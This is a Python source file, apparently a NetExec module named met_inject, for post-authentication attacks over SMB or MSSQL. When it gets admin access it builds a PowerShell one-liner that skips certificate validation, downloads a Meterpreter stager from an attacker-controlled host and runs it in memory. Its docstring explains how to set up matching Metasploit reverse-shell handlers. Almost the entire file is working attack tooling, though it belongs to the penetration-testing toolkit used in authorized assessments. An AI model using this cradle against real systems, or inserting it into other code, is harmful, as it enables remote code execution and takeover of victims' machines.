from sys import exit


class NXCModule:
    """
    Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
    Module by @byt3bl33d3r
    """

    name = "met_inject"
    description = "Downloads the Meterpreter stager and injects it into memory"
    supported_protocols = ["smb", "mssql"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.rand = None
        self.srvport = None
        self.srvhost = None
        self.met_ssl = None
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """
        SRVHOST     IP hosting of the stager server
        SRVPORT     Stager port
        RAND        Random string given by metasploit (if using web_delivery)
        SSL         Stager server use https or http (default: https)
        
        This module is compatable with --obfs, --force-ps32 (PowerShell execution options)

        multi/handler method that don't require RAND:
            Set LHOST and LPORT (called SRVHOST and SRVPORT in nxc module options)
            Set payload to one of the following (non-exhaustive list):
                windows/x64/powershell_reverse_tcp
                windows/x64/powershell_reverse_tcp_ssl
        Web Delivery Method (exploit/multi/script/web_delivery):
            Set SRVHOST and SRVPORT
            Set target 2 (PSH)
            Set payload to what you want (windows/meterpreter/reverse_https, etc)
                check compatabile payloads with `show payloads`
            Optional: SET URIPATH {custom}
            After running, copy the end of the URL printed (e.g. M5LemwmDHV) and set RAND to that, or whatever you set URIPATH to
        """
        self.met_ssl = "https"

        if "SRVHOST" not in module_options or "SRVPORT" not in module_options:
            context.log.fail("SRVHOST and SRVPORT options are required!")
            exit(1)

        if "SSL" in module_options:
            self.met_ssl = module_options["SSL"]
        if "RAND" in module_options:
            self.rand = module_options["RAND"]

        self.srvhost = module_options["SRVHOST"]
        self.srvport = module_options["SRVPORT"]

    def on_admin_login(self, context, connection):
        # https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/code_execution/Invoke-MetasploitPayload.ps1
        proto = "http" if self.met_ssl == "http" else "https"
        metasploit_endpoint = f"{proto}://{self.srvhost}:{self.srvport}/{self.rand}"
        context.log.debug(f"{metasploit_endpoint=}")
        
        # use single quotes inside because if we run this in 32bit PowerShell, the entire command is double quoted (see helpers/powershell.py:create_ps_command())
        command = f"$ProgressPreference = 'SilentlyContinue'; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{metasploit_endpoint}');"
        context.log.debug(f"Running command via ps_execute: {command}")
        
        output = connection.ps_execute(command)
        context.log.debug(f"Received output from ps_execute: {output}")
        
        if output and "Unable to connect to the remote server" in output:
            context.log.error("Executed payload, but the cradle was unable to download the stager, is the Metasploit server running?")
        else:
            context.log.success("Executed payload")
